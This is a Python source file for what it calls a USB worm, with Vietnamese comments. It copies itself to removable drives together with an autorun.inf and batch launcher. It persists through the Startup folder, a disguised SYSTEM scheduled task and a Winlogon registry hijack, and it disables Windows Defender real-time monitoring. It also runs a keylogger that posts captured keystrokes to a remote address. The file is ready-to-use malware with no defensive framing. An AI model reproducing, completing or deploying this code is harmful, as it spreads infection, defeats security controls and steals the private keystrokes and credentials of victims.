import os
import time
import subprocess
import threading
import sys

from pynput.keyboard import Key, Listener
from shutil import copyfile
from random import choice
from requests import post

# Delay khởi động
time.sleep(0.5)

# Xác định tên file hiện tại
if getattr(sys, 'frozen', False):
    # Nếu chạy dưới dạng .exe (PyInstaller)
    this_file = os.path.basename(sys.executable)  # Lấy tên file .exe (USB-Worm.exe)
else:
    # Nếu chạy dưới dạng .py
    this_file = os.path.basename(_file_)  # Lấy tên file .py (USB-Worm.py)

# Biến toàn cục
count = 0
count_2 = 0
keys = []
logfile = None  # Khởi tạo logfile
victimID = None
logsize = 0

def USBDetect():
    global textfile, singleUSB

    if os.name == 'nt':
        USBDir = ['E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\']
        textfile = "usb_exist.txt"

    lencount = len(USBDir) - 1

    global USBList
    USBList = []

    singleUSB = ""
    
    while lencount >= 0:
        time.sleep(0.1)
        try:
            if os.path.exists(USBDir[lencount]):
                USBList.append(USBDir[lencount])
                print("Found " + USBDir[lencount])
                singleUSB = USBDir[lencount]
                lencount -= 1
            else:
                lencount -= 1
        except IOError:
            print("USB ioerror")

    if not USBList:
        print("No USB Detected\n")
        
    for usb in USBList:
        print("\nUSB's Detected: " + usb + "\n")

def USBrw():
    fullname = os.path.join(singleUSB, textfile)  # E:\usb_exists.txt
    try:
        with open(fullname, "a") as f:
            f.close()
        print("Successfully wrote usb_exists.txt file...")
        os.remove(fullname)  # usb_exist.txt
    except IOError:
        print("Permission error writing usb_exists file...")

def WinBat():
    print("Running Bat Module\n")
    time.sleep(0.5)

    batch = "batch.bat"
    fullname = os.path.join(singleUSB, batch)  # E:\batch.bat
    try:
        if os.name == 'nt':
            if getattr(sys, 'frozen', False):
                command = f"start {this_file}"  # Chạy trực tiếp .exe
            else:
                command = f"start python.exe {this_file}"  # Chạy .py qua Python
            with open(fullname, "w") as f:
                time.sleep(1)
                f.write(command)
    except IOError:
        print("Permission error writing bat File...")

def WinAutorun():
    autorun = "autorun.inf"
    fullname = os.path.join(singleUSB, autorun)  # E:\autorun.inf
    try:
        if os.name == 'nt':
            with open(fullname, "w") as f:
                time.sleep(0.1)
                f.write("[autorun]\n")
                f.write("open = batch.bat\n")
                f.write("action = run program\n")
    except IOError:
        print("Permission error writing autorun.inf file")

def WinWorm():
    fullname = os.path.join(singleUSB, this_file)  # E:\USB-Worm.exe hoặc .py
    try:
        if os.name == 'nt':
            if getattr(sys, 'frozen', False):
                source_file = sys.executable  # Đường dẫn đến USB-Worm.exe
            else:
                source_file = _file_  # Đường dẫn đến USB-Worm.py
            copyfile(source_file, fullname)
            print("Successfully wrote worm file...")
    except IOError:
        print("Permission error writing worm file " + singleUSB + "\n")

def Startup():
    persistence1 = os.path.expanduser('~') + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    if getattr(sys, 'frozen', False):
        source_file = sys.executable
    else:
        source_file = _file_
    copyfile(source_file, os.path.join(persistence1, this_file))

def DisableDefender():
    subprocess.run(['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-Command', 'Set-MpPreference -DisableRealTimeMonitoring $true'], shell=True)

def Schtask():
    temp_path = os.environ.get("TEMP") + "\\" + this_file
    if getattr(sys, 'frozen', False):
        source_file = sys.executable
    else:
        source_file = _file_
    copyfile(source_file, temp_path)
    sch = f"C:\\windows\\system32\\schtasks.exe /Create /TN Intel_Host /TR {temp_path} /SC ONSTART /RU SYSTEM"
    with open("temp.bat", "w") as f:
        f.write("@echo off\n")
        f.write(sch)
    subprocess.run(["temp.bat"])
    os.remove("temp.bat")

def Register():
    temp_path = os.environ.get("TEMP") + "\\" + this_file
    if getattr(sys, 'frozen', False):
        source_file = sys.executable
    else:
        source_file = _file_
    copyfile(source_file, temp_path)
    reg = f"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d \"Userinit.exe, {temp_path}\" /f"
    with open("temp2.bat", "w") as f:
        f.write("@echo off\n")
        f.write(reg)
    subprocess.run(["temp2.bat"])
    os.remove("temp2.bat")

def SpreadfromUSB():
    currentdir = os.getcwd()
    if currentdir.lower().startswith("e:\\") or currentdir.lower().startswith("f:\\") or currentdir.lower().startswith("g:\\"):
        print("worm is on the usb")
        Startup()

def CheckUSB():
    while True:
        USBDetect()
        SpreadfromUSB()
        if USBList:
            USBrw()
            WinBat()
            WinAutorun()
            WinWorm()
            print("Finished")
        time.sleep(15)

def GenvictimID():
    global victimID
    string_az = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    string_AZ = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    string_09 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    victimID = ""
    for x in range(5):
        random_list = choice(['0', '1', '2'])
        if random_list == "0": victimID += choice(string_az)
        if random_list == "1": victimID += choice(string_AZ)
        if random_list == "2": victimID += choice(string_09)

def press(key):
    global keys, count, count_2
    if key == Key.backspace:
        keys.append("BACKSPC")
    elif key == Key.shift:
        keys.append("SHIFT")
    elif key == Key.shift_l:
        keys.append("LSHIFT")
    elif key == Key.shift_r:
        keys.append("RSHIFT")
    elif key == Key.esc:
        keys.append("ESC")
    elif key == Key.alt:
        keys.append("ALT")
    elif key == Key.cmd:
        keys.append("WIN")
    elif key == Key.cmd_l:
        keys.append("LWIN")
    elif key == Key.cmd_r:
        keys.append("RWIN")
    elif key == Key.tab:
        keys.append("TAB")
    elif key == Key.ctrl:
        keys.append("CTRL")
    elif key == Key.ctrl_l:
        keys.append("LCTRL")
    elif key == Key.ctrl_r:
        keys.append("RCTRL")
    elif key == Key.caps_lock:
        keys.append("CAPSL")
    elif key == Key.alt_gr:
        keys.append("ALTGR")
    elif key == Key.space:
        keys.append(" ")
    else:
        keys.append(key)
    count += 1
    count_2 += 1
    if count >= 1:
        count = 0
        Writefile(keys)
        keys = []

def release(key):
    pass

def Writefile(keys):
    global count_2, logfile, logsize
    if logfile is None:
        return  # Thoát nếu logfile chưa được gán
    with open(logfile, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            if count_2 >= 15:
                f.write("\n")
                count_2 = 0

def Getlogsize():
    global logsize
    x = 1
    while True:
        time.sleep(10)
        if not os.path.exists(logfile):
            time.sleep(1)  # Chờ một chút nếu file chưa tồn tại
            continue
        logsize = os.path.getsize(logfile)
        print(logsize)
        if logsize >= 1000:
            with open(logfile, "r") as f:
                with open(logfile + str(x), "w") as f2:
                    f2.write(f.read())
            filetopost = {'file': open(logfile + str(x), 'rb')}
            post('192.168.5.129', files=filetopost)
            time.sleep(10)
            os.remove(logfile)
            time.sleep(3)
            os.remove(logfile + str(x))
            x += 1

def startKL():
    with Listener(on_press=press, on_release=release) as listener:
        listener.join()
    Writefile(keys)

if _name_ == "_main_":
    t1 = threading.Thread(target=CheckUSB)
    t1.start()


    t2 = threading.Thread(target=startKL)
    t2.start()